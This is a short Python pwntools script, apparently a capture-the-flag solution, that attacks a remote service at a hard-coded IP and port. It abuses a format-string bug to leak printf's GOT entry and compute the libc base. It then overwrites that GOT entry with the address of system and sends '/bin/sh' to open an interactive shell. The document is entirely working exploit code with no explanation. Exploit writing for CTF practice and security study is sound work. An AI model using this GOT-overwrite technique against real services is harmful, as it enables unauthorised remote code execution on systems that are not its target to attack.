#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "78.46.224.86"
port = 1337

r = remote(host,port)
context.arch = "amd64"

def leak(addr):
    payload= "%7$sbbbb" + p64(addr)
    r.sendline(payload)
    data = r.recvuntil("bbbb")[:-4]
    if (addr & 0xff) == 0 :
        pass
    else:
        r.recv(100)
    return data + "\x00"

printf_off = 0x56550
printf_got = 0x601018
libc = u64(leak(printf_got).ljust(8,"\x00")) - printf_off
print "libc:" ,hex(libc)
system_off = 0x456d0
system = libc + system_off

prev = 0
payload = ""
for i in range(6):
    payload += fmtchar(prev,(system >> i*8 ) & 0xff,21+i)
    prev = (system >> i*8 ) & 0xff
payload = payload.ljust(0x78,"c")
payload += flat([printf_got,printf_got+1,printf_got+2,printf_got+3,printf_got+4,printf_got+5])
r.sendline(payload)
r.sendline("/bin/sh\x00")
r.interactive()
